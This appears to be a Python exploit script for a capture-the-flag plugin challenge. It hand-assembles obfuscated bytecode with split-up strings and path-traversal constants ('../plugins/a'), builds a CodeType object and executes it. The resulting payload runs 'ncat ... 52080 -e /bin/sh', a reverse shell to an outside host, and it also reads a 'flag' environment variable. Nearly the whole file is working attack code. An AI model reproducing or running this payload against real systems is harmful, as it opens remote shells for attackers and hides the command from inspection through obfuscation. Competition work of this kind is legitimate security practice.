# type: ignore
from pwn import *
from os import path
from types import CodeType
import dis

path.__dict__['os'].getenv('flag')


def plugin_1234():
    a = str('00osflag0000')
    p = int('000000000002')
    str1 = b"ncat sol.plu"
    str2 = b"s.or.kr 5208"
    str3 = b"0 -e /bin/sh"
    
    __import__(a[p:p*p]).system(str1+str2+str3)

print(f"const: {plugin_1234.__code__.co_consts}")  
print(f"names: {plugin_1234.__code__.co_names}") 
print(f"code:  {plugin_1234.__code__.co_code}")
dis.dis(plugin_1234)
# plugin_1234()

pname = "1"
names = ['str', 'int', '__import__', 'system', 'a', 'p', 'q', 'r', 's']
code = plugin_1234.__code__.co_code

def plugin_log():
    return 1
for i in names:
    code += (';'+i).encode('utf-8')

for repl1 in [b'}', b'|']:
    for repl2 in [b'\x00', b'\x01', b'\x02', b'\x03', b'\x04']:
        repl = repl1 + repl2
        if repl1 == b'}':
            code = code.replace(repl, b'\x5a'+(int.from_bytes(repl2, "little")+4).to_bytes(1, byteorder='little'))
        else:
            code = code.replace(repl, b'\x65'+(int.from_bytes(repl2, "little")+4).to_bytes(1, byteorder='little'))

for repl1 in [b'\x64']:
    for repl2 in [b'\x01', b'\x02', b'\x03', b'\x04', b'\x05']:
        repl = repl1 + repl2
        if repl1 == b'}':
            code = code.replace(repl, b'\x64'+(int.from_bytes(repl2, "little")+0x5d).to_bytes(1, byteorder='little'))
        else:
            code = code.replace(repl, b'\x64'+(int.from_bytes(repl2, "little")+0x5d).to_bytes(1, byteorder='little'))

print(code, len(code)//12 + (0 if len(code)%12 == 0 else 1), len(code))

names = ['str', 'int', '__import__', 'system', 'a', 'p', 'q', 'r', 's', '', '', '', '', '', '']
consts = [b'0\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'1\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'2\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'3\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'4\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'5\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'6\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'7\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'8\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'9\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'10\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'11\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'12\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'13\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'14\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'15\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'16\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'17\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'18\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'19\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'20\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'21\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'22\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'23\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'24\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'25\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'26\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'27\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'28\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'29\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'30\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'31\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'32\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'33\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'34\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'35\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'36\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'37\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'38\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'../plugins/a', b'../plugins/b', b'../plugins/c', b'../plugins/d', b'../plugins/e', b'../plugins/f', b'../plugins/g', b'../plugins/h', b'../plugins/i', b'./plugins/nn', b't\x00d\x01\x83\x01Z\x04t\x01d\x02', b'\x83\x01Z\x05d\x03Z\x06d\x04Z\x07', b'd\x05Z\x08t\x02e\x04e\x05e\x05', b'e\x05\x14\x00\x85\x02\x19\x00\x83\x01\xa0\x03', b'e\x06e\x07\x17\x00e\x08\x17\x00\xa1\x01', b'\x01\x00d\x00S\x00;str;i', b'nt;__import_', b'_;system;a;p', b';q;r;s;;;;;;', b';;;;;;;;;;;\xff', b'57\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'58\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'59\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'60\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'61\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'62\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'63\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'64\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'65\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'66\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'67\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'68\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'69\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'70\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'71\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'72\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'73\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'74\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'75\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'76\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'77\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'78\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'79\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'80\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'81\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'82\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'83\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'84\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'85\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'86\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'87\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'88\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'89\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'90\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff', b'000000000000', b'osflag000000', b'000000000002', b'ncat sol.plu', b's.or.kr 5208', b'0 -e /bin/sh']
consts.append(plugin_log)



plugin = CodeType(
    0,                  # co_argcount
    0,                  # co_posonlyargcount
    0,                  # co_kwonlyargcount
    0,                  # co_nlocals
    256,                # co_stacksize
    0,                  # co_flags
    code,               # co_code
    tuple(consts),      # co_consts
    tuple(names),       # co_names
    (),                 # co_varnames
    f'plugin_{pname}',  # co_filename
    f'plugin_{pname}',  # co_name
    0,                  # co_firstlineno
    b'',                # co_linetable
    (),                 # co_freevars
    ()                  # co_cellvars   
)

dis.dis(plugin)
exec(plugin)
